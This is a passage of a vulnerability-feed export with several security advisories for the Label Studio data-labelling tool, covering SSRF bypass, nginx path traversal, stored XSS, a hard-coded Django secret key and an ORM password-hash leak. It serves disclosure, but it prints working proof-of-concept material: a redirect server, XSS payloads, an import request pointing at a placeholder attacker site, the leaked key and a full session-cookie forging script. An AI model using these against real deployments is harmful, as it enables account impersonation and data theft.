`1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to 